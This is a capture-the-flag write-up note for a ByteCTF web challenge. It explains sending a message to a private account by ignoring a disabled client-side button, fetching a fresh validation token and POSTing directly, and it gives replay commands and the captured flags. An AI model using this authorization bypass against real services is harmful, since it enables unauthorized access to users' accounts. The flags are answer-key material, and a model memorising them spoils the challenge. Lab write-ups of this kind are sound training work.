# NO.14 Private Messenger

## Metadata

- Event: ByteCTF challenge 143
- Category: Web
- Pattern: client-side disabled action with reachable validation token
- Knowledge link:
  [ctf-knowledge-web.md#client-side-disabled-actions-with-server-validation-tokens](ctf-knowledge-web.md#client-side-disabled-actions-with-server-validation-tokens)
- Local solutions:
  [solution note](../../../ctf/bytectf-143/challenges/no14-private-messenger/notes/solution.md)
  and
  [af23 recheck note](../../../ctf/bytectf-143/challenges/no14-private-messenger-af23/notes/solution.md)

## Prompt Summary

The challenge describes a private Messenger account. The goal is to send a
message to the private account and recover the flag returned by that account.

## Signals

- Public registration exposes privacy-related settings.
- The authenticated user list leaks usernames and numeric user ids.
- User profile routes are direct object routes: `/profile?id=<id>`.
- The target profile says it is private, but still renders
  `/send_message_profile?id=<target_id>` and hidden `profile_id=<target_id>`.
- The browser disables the send button and conditionally avoids fetching the
  validation token when disabled.
- `utility.js` shows that a hidden `validation` field is the real form token.
- `/api/validation/<id>` is reachable and returns a numeric validation value.

## Route

1. Capture landing, register, login, base, invites, profile, and scripts with
   `ctf_web.py`.
2. Create two controlled accounts to learn the normal invite, accept, profile,
   validation, and send-message state transitions.
3. Confirm that stale validation values are rejected, so the replay must use
   the latest value.
4. Request the target profile and observe that only the client button is
   disabled.
5. Fetch a fresh validation value for the target id.
6. POST directly to `/send_message_profile?id=<target_id>` with
   `message`, `profile_id`, and `validation`.
7. Read `/fetch_messages`; the private user auto-replies with the flag.

## Instance Rule

Flags and validation values are instance-specific. If the platform respawns the
same challenge under a new host, reuse the route shape but rerun the final
fresh-token POST and `/fetch_messages` read on the current host. Do not submit
a flag copied from an older host's evidence.

## Replay Commands

```bash
python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no14-private-messenger \
  --url '/profile?id=27584913' \
  --cookie-jar artifacts/login_codex_a-cookies.json \
  --label profile_flag_user_from_a_before_friend

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no14-private-messenger \
  --url '/api/validation/27584913' \
  --cookie-jar artifacts/login_codex_a-cookies.json \
  --label validation_flag_user_latest_before_send

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no14-private-messenger \
  --url '/send_message_profile?id=27584913' \
  --method POST \
  --data 'message=hello-private-expert-valid&profile_id=27584913&validation=<latest_validation>' \
  --cookie-jar artifacts/login_codex_a-cookies.json \
  --label send_a_to_flag_validation_latest \
  --no-redirect \
  --save-cookies login_codex_a_after_send_flag_latest

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no14-private-messenger \
  --url '/fetch_messages' \
  --cookie-jar artifacts/login_codex_a_after_send_flag_latest-cookies.json \
  --label fetch_messages_codex_a_after_flag_valid_send
```

## False Leads

- Treating `disabled` as server-side authorization.
- Reusing an old validation token after another token request.
- Assuming private profile text means the send route is unavailable.
- Looking for password reset or account takeover before learning the normal
  message workflow with controlled users.

## Final

- Original `aa4701...` instance:
  `flag{5a91460495d1e14537b802f4f4d1567e8493fcee323f9f2b6a544997}`
- Current rechecked `af23...` instance:
  `flag{71e28aa60dad49689f1f85910a3d20a571bbe1d15ebb158d67eaca4e}`
